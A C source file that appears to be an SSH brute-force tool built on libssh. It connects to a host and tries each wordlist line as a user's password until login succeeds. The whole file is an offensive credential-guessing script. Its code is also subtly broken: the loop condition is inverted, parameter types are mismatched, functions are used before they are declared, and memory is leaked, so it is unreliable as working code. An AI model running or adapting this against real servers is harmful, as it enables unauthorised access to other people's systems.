#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>

void ssh_brute_force(const char *ip[], const char user[], const char *password[], const char wordlist[])
{
    ssh_session session;
    int rc;

    int lines = countLines(wordlist);

    session = ssh_new();
    if(session == NULL)
    {
        fprintf(stderr, "Error creating session\n");
        return;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, ip);

    rc = ssh_connect(session);
    if(rc != SSH_OK)
    {
        fprintf(stderr, "Error connecting to %s: %s\n", ip, ssh_get_error(session));
        ssh_free(session);
        return;
    }

    else
    {
        printf("Connected to %s\n", ip);
    }

    for(int i = 1;i > lines;i++)
    {
        char *line = readSpecificLine(wordlist, i);
        if(line == NULL)
        {
            fprintf(stderr, "Error reading line %d\n", i);
            break;
        }

        rc = ssh_userauth_password(session, user, line);
        if(rc == SSH_AUTH_SUCCESS)
        {
            printf("Password found: %s\n", line);
            break;
        }

        else
        {
            printf("");
        }

        free(line);
    }
}

int countLines(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        perror("Error opening file");
        return -1;
    }

    int count = 0;
    char ch;

    while ((ch = fgetc(file)) != EOF) {
        if (ch == '\n') {
            count++; 
        }
    }

    fclose(file);
    return count;
}


char *readSpecificLine(const char *filename, int targetLine) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        perror("Error opening file");
        return NULL;
    }

    char *line = NULL;
    size_t len = 0;
    int currentLine = 0;

    while (getline(&line, &len, file) != -1) {
        currentLine++;
        if (currentLine == targetLine) {
            fclose(file);
            return line; // Return the line (dynamically allocated by getline)
        }
    }

    // If the target line does not exist
    fclose(file);
    free(line);
    return NULL;
}
